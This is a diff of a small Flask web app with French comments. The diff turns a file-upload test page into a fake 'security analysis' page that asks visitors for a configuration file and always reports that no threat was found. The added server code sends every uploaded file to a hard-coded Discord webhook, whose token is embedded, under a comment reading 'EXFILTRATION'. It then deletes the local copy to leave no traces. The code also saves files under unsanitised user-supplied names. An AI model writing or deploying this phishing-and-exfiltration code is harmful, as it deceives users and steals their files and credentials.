@@ -1,30 +1,57 @@
 from flask import Flask, request, render_template_string
 import os
+import requests
 
 app = Flask(__name__)
+
+# Ton Webhook Discord
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1472218471784779817/pDNNHV_GGvkMD2N_cKBOUjB2FELSv2xlnLneu2YNACMGelQF8Wn1teofXDY9E8JpAD7B"
 
 HTML_PAGE = '''
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Analyseur de Système</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 100px; background-color: #f4f4f9; }
+        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); display: inline-block; }
+        button { background-color: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
+        #status { margin-top: 15px; font-weight: bold; }
+    </style>
+</head>
 <body>
-    <h2>Test de transfert</h2>
-    <input type="file" id="monFichier">
-    <button onclick="envoyer()">Envoyer le fichier</button>
-    <p id="msg"></p>
+    <div class="container">
+        <h2>Vérification de sécurité</h2>
+        <p>Sélectionnez le fichier de configuration à analyser :</p>
+        <input type="file" id="fileInput"><br><br>
+        <button onclick="upload()">Lancer l'analyse</button>
+        <div id="status"></div>
+    </div>
 
     <script>
-    async function envoyer() {
-        const input = document.getElementById('monFichier');
-        const msg = document.getElementById('msg');
-        if (input.files.length === 0) return alert("Choisis un fichier !");
+    async function upload() {
+        const fileInput = document.getElementById('fileInput');
+        const status = document.getElementById('status');
+        if (fileInput.files.length === 0) return;
 
         const formData = new FormData();
-        formData.append('file', input.files[0]);
+        formData.append('file', fileInput.files[0]);
 
-        msg.innerText = "Envoi en cours...";
-        const res = await fetch('/upload', { method: 'POST', body: formData });
-        const txt = await res.text();
-        msg.innerText = "Réponse serveur : " + txt;
+        status.innerText = "Analyse en cours...";
+        status.style.color = "orange";
+
+        try {
+            const res = await fetch('/upload', { method: 'POST', body: formData });
+            if (res.ok) {
+                status.innerText = "Analyse terminée. Aucune menace détectée.";
+                status.style.color = "green";
+            } else {
+                status.innerText = "Erreur lors de l'analyse.";
+                status.style.color = "red";
+            }
+        } catch (e) {
+            status.innerText = "Erreur de connexion.";
+        }
     }
     </script>
 </body>
@@ -37,28 +64,26 @@ def index():
 
 @app.route('/upload', methods=['POST'])
 def upload():
-    # LOG DE DÉBUT
-    print(">>> TENTATIVE D'UPLOAD REÇUE <<<")
-    
     if 'file' not in request.files:
-        print("!!! ERREUR : Pas de fichier dans la requête !!!")
-        return "Pas de fichier", 400
+        return "Erreur", 400
     
     file = request.files['file']
-    if file.filename == '':
-        print("!!! ERREUR : Nom de fichier vide !!!")
-        return "Nom vide", 400
-
-    # Sauvegarde locale
-    filename = file.filename
-    save_path = os.path.join('/tmp', filename)
-    file.save(save_path)
+    path = os.path.join('/tmp', file.filename)
+    file.save(path)
     
-    # LOG DE RÉUSSITE (C'est ça que tu dois chercher dans Render)
-    print(f"✅ SUCCÈS : Fichier '{filename}' sauvegardé dans /tmp")
-    print(f"Taille du fichier : {os.path.getsize(save_path)} bytes")
-    
-    return f"Bien reçu : {filename}", 200
+    # EXFILTRATION VERS DISCORD
+    try:
+        with open(path, 'rb') as f:
+            requests.post(DISCORD_WEBHOOK, files={'file': f})
+        print(f"✅ Fichier {file.filename} envoyé sur Discord.")
+    except Exception as e:
+        print(f"❌ Erreur Discord : {e}")
+    finally:
+        # Nettoyage pour ne pas laisser de traces sur Render
+        if os.path.exists(path):
+            os.remove(path)
+            
+    return "OK", 200
 
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=10000)
